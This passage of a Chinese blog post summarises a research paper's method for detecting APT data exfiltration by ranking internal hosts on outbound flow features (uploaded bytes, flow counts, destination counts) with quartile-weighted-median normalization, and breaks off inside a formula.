class="markdownIt-Anchor" href="#32-僵尸网络检测"></a> 3.2 僵尸网络检测</h2><p>对僵尸网络的检测是分析大量具有相似行为的主机，而APT受害网络中可能仅包含少数受害主机，所以不能用检测僵尸网络的聚类分析方法来检测APT受害网络。</p><p>另外，二者的感染策略也是不同的。</p><h2 id="33-内部威胁"><a class="markdownIt-Anchor" href="#33-内部威胁"></a> 3.3 内部威胁</h2><p>内部威胁与APT攻击也有相似之处，但不同在于内部威胁在进行数据窃取时，可能不需要通过网络，因此检测内部威胁多集中于主机日志或者蜜罐策略上。而本文提出的框架，可以轻松集成到内部威胁检测系统中。</p><h1 id="4-apt生命周期"><a class="markdownIt-Anchor" href="#4-apt生命周期"></a> 4 APT生命周期</h1><p>下面我们分析APT的各个攻击阶段，阐述其为什么能够用网络流量来分析：</p><ul><li>reconnaissance phase：寻找网络的可能入口点，会进行扫描操作</li><li>compromise phase：在目标系统在安装恶意软件RAT：Remote Access Trojan、 Remote Administration Tool</li><li>maintaining access phase：RAT联接C&amp;C服务器来接受攻击者的指令。值得注意的是，这个阶段的网络连接是由受害者主机发起的，而不是攻击者。这样做的目的，一是骗过防火墙；二是攻击者因此会减少被检测到的机会，这是因为从外部网络下载内容会被高度怀疑。</li><li>lateral movement phase：攻击者想要获得其它主机的访问权限。如RAT可能会进行内部的扫描，或者试图与组织内部的其它主机建立新的连接。</li><li>data exfiltration phase：被窃取的数据被发送到攻击者控制的远程服务器。这个过程有可能是一次性迅速（burst）完成的，也有可能是慢速（low-and-slow）的。</li></ul><h1 id="5-apt检测的挑战"><a class="markdownIt-Anchor" href="#5-apt检测的挑战"></a> 5 APT检测的挑战</h1><ul><li>不平衡的数据（Imbalanced data）：在巨大量的数据中，APT只占很少一部分，因此使得攻击难以检测</li><li>Base-rate问题：APT相关的事件非常少，而且时间跨度很长，因此会带来恒奥的误报率。</li><li>缺乏公开数据</li><li>加密和标准协议（例如HTTPS）的使用会阻碍常用的网络安全解决方案，例如基于签名的入侵检测系统。</li></ul><p>下图是10k个主机环境中的网络统计情况：</p><p><img src="https://img-blog.csdnimg.cn/20200220181531852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>(a)和(b)分别是对同一分布的不同描述，从图(a)中可以看出该分布属于<strong>重尾分布</strong>。该图表示从内部主机向外部IP地址建立连接的数量，事件跨度是一天。如在图(a)中，第一个直方图表示有大约2M个IP地址仅仅被连接了一次，第二个直方图表示有大约220K个IP地址仅仅被连接了3次。因此我们可以得出<strong>结论</strong>：<strong>大多数外部主机仅被连接一次或几次</strong>。</p><p>出现这种现象的原因与<strong>云计算</strong>的广泛应用有关。即使是在很短的时间内，与外部地址连接的总数也相当高，但是大部分的外部地址仅仅被连接了很少几次。这样的结果是不希望看到的，这样的连接情况会连接多个不同的云计算提供商。</p><p>针对该问题前人的一些方法：</p><ul><li>为所有的云计算提供商设置白名单；但这样攻击者很容易创建一个云账号来作为C&amp;C服务器或者数据窃取点</li><li>基于阈值：效果不佳，因为无法为这种重尾分布设置合适的阈值</li><li>聚类：这会将数据聚成两类，一类是头一类是尾</li><li>箱线图规则（boxplot）：这对于离群值检测无效，因为基础分布不是高斯分布</li></ul><p>于是，本文提出的方法将单个主机的行为建模，将其作为多重特征空间中的特征点；然后比较主机的统计信息，包括它们的过去以及所有其他内部主机的统计信息；然后为每个内部主机分配一个分数。</p><h1 id="6-框架概览"><a class="markdownIt-Anchor" href="#6-框架概览"></a> 6 框架概览</h1><p>本文所提方法的特点如下：</p><ul><li>基于流量信息，这些数据通过网络探针可以很容易地获得</li><li>提取并分析流量记录，这使得存储和计算消耗都有所降低</li><li>通过下面两方面来识别执行可疑活动的主机：<ul><li>分析他们之前的行为</li><li>分析其他主机的行为</li></ul></li><li>提出了一些特征，用于识别可能与数据窃取有关的主句</li><li>所提出的“排名”的方法，不依赖于深度包检测，因此可以运行在加密的流量上</li></ul><p>本文所提出的系统架构如下图所示，其工作过程包括5个阶段：</p><p><img src="https://img-blog.csdnimg.cn/20200220181549532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>（1）<strong>流量收集和存储</strong>：不使用原始的流量数据（raw traffic data），而是使用流量记录（flow record）；每条记录包含从IP头部中提取的数据，包括：源、目的地址和端口号，协议类型。这样做对系统性能有很多好处：</p><ul><li><p>易于存储和压缩</p></li><li><p>计算上更可行</p></li></ul><p>之前我们说，假设所有与外部的连接都是由内而外发起的，所以我们仅仅考虑出站流量，即从内部发往外部的流量。而从外部发往内部的可以用传统的IDS来检测</p><p>（2）<strong>特征提取</strong>：提取与数据窃取相关的特征，特征在每台主机上每隔时间T计算一次。特征提取工作由专用服务器完成。</p><p>（3）<strong>特征归一化</strong>：将不同的特征归一化，因为每个特征都有不同的重尾分布，因此处于比较目的，必须将其归一化。这一步的实现由参考文献[45]中的归一化度量完成，这种方法专用于归一化具有不同特征的重尾分布。</p><p>（4）<strong>可疑分数计算</strong>：对于每台主机，每个时间<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">t_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，该阶段涉及与特征空间中主机行为有关的统计信息的计算，为此我们考虑三个点：</p><ul><li>当前时间<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">t_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>时，主机的特征值</li><li>历史窗口W下（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>t</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn><mo>−</mo><mi>W</mi></mrow></msub></mrow><annotation encoding="application/x-tex">t_{i-1-W}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8234109999999999em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>t</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">t_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8234109999999999em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>），同一主机的标签值的<strong>质心</strong>（centroid）</li><li>时间<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">t_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>时，所偶有主机的特征值的质心</li></ul><p>历史窗口表示主机过去的行为。考虑了最近过去（<strong>recent past</strong>）的运动方向，因此沿罕见方向的运动被认为是可疑的。</p><p>（5）<strong>排名</strong>：可疑程度通过以下方式的线性组合进行评估：</p><ul><li>内部主机相对于特征空间质心的归一化距离</li><li>运动幅度的增长百分比</li><li>相对于所观察的网络环境中所有内部主机的运动而言，运动方向的不可能度。</li></ul><p>我们注意到，第2、3、4个阶段可以在每台主机上<strong>独立并行执行</strong>。</p><h1 id="7-特征提取和归一化"><a class="markdownIt-Anchor" href="#7-特征提取和归一化"></a> 7 特征提取和归一化</h1><h2 id="71-特征提取"><a class="markdownIt-Anchor" href="#71-特征提取"></a> 7.1 特征提取</h2><p>定义：</p><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>H</mi><mi>I</mi></msub></mrow><annotation encoding="application/x-tex">H_{I}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>H</mi><mi>E</mi></msub></mrow><annotation encoding="application/x-tex">H_{E}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">E</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>分别表示内部和外部主机的集合</li><li>对于每个内部主机<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mo>∈</mo><msub><mi>H</mi><mi>I</mi></msub></mrow><annotation encoding="application/x-tex">h \in H_{I}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，特征向量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathbf{x}_{t}(h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mclose">)</span></span></span></span>由下面的元组定义：</li></ul><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="bold">x</mi><mi>t</mi></msub><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">(</mo><msubsup><mi>x</mi><mi>t</mi><mn>1</mn></msubsup><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msubsup><mi>x</mi><mi>t</mi><mn>2</mn></msubsup><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msubsup><mi>x</mi><mi>t</mi><mi>N</mi></msubsup><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{x}_{t}(h)=\left(x_{t}^{1}(h), x_{t}^{2}(h), \ldots,x_{t}^{N}(h)\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">x</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span>，其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mi>t</mi><mi>i</mi></msubsup><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x_{t}^{i}(h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0746639999999998em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mclose">)</span></span></span></span>对应时间<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">t</span></span></span></span>时，内部主机<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span></span></span></span>特征向量的第<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>个组成部分的值；另外<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mi>t</mi><mi>i</mi></msubsup><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x_{t}^{i}(h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0746639999999998em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">h</span><span class="mclose">)</span></span></span></span>每隔一个取样周期<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span>计算一次，据此来建立一个时间序列。</p><p>我们将时间粒度<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span>设置为1天，原因如下：</p><ul><li>APT攻击时间跨度较长，设置太细的时间粒度的话，会产生很多噪声</li><li>每天产生一次排序列表，有助于分析人员进行分析</li></ul><p>下面，我们定义了一系列的特征：</p><ul><li><strong>numbytes</strong>：<strong>由内部主机上传到外部地址兆字节（megabytes）数</strong>。用来监视上传字节的偏移（deviations of uploaded bytes），因为这有可能跟数据窃取有关。例如，如果主机的upload字节数增加了十倍，则它可能参与了APT相关的活动。</li><li><strong>numflows</strong>：内部主机发起的连接到外部主机的flow数量。用来监视由内部主机发起的数据传送。由内部主机发起数据泄露有如下两个原因：(i)向外的连接大多数防火墙都不会拦截；(ii)外部主机发起的连接会很容易被传统的IDS蓝饥饿</li><li><strong>numdst</strong>：内部主机发起的连接中，外部IP地址的数量。用来检测那些包含许多变化的目的IP的异常行为，这些连接同样是由内部主机发起的。例如。进行通信的外部IP数量稳定，但是upload字节数或者连接数却急剧上升，这就很有可能发生了与数据窃取相关的APT活动。</li></ul><p>我们意识到，正常情况下，numflows和numdst几乎是同步增减的。虽然在机器学习中，建议我们尽量选取不相关的特征来获取更多信息，但是我们的问题并不是一个分类问题，因此我们选择两个相关的特征，来捕获那些违反了numflows和numdst之前预期关系的主机。</p><p>下图是本文所用数据的特征分布情况：</p><p><img src="https://img-blog.csdnimg.cn/20200220181716120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>下图是特征空间的3D表示，</p><p><img src="https://img-blog.csdnimg.cn/20200220181722219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>通过监视主机的移动和他们与过去、与特征空间质心之间的举例，来检测异常主机。</p><h2 id="72-特征归一化normalization"><a class="markdownIt-Anchor" href="#72-特征归一化normalization"></a> 7.2 特征归一化（Normalization）</h2><p>为了公平地比较内部主机的移动和位置，必须对其分布进行归一化。</p><p>一种方法是range归一化，即将数据映射为0到1之间的数。但是对于重尾分布来说，这种方法会导致大部分数据都接近于0。</p><p>为了解决这个问题，本问提出了<strong>双边四分位数加权中位数</strong>（<strong>two-sided quartile weighted median</strong>，<strong>QWM</strong>）指标：</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Q</mi><mi>W</mi><mi>M</mi><mo stretchy="false">(</mo><mi>D</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><msub><mi>Q</mi><mn>75</mn></msub><mo stretchy="false">(</mo><mi>D</mi><mo stretchy="false">)</mo><mo>+</mo><mn>2</mn><mo>⋅</mo><msub><mi>Q</mi><mn>50</mn></msub><mo stretchy="false">(</mo><mi>D</mi><mo stretchy="false">)</mo><mo>+</mo><msub><mi>Q</mi><mn>25</mn></msub><mo stretchy="false">(</mo><mi>D</mi><mo stretchy="false">)</mo></mrow><mn>4</mn></mfrac></mrow><annotation encoding="application/x-tex">Q W M(D)=\frac{Q_{75}(D)+2 \cdot Q_{50}(D)+Q_{25}(D)}{4}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">Q</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">7</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">D</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">2</span><span class="mbin mtight">⋅</span><span class="mord mtight"><span class="mord mathdefault mtight">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">D</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathdefault mtight">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">D</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>其中，<span class="katex"><span 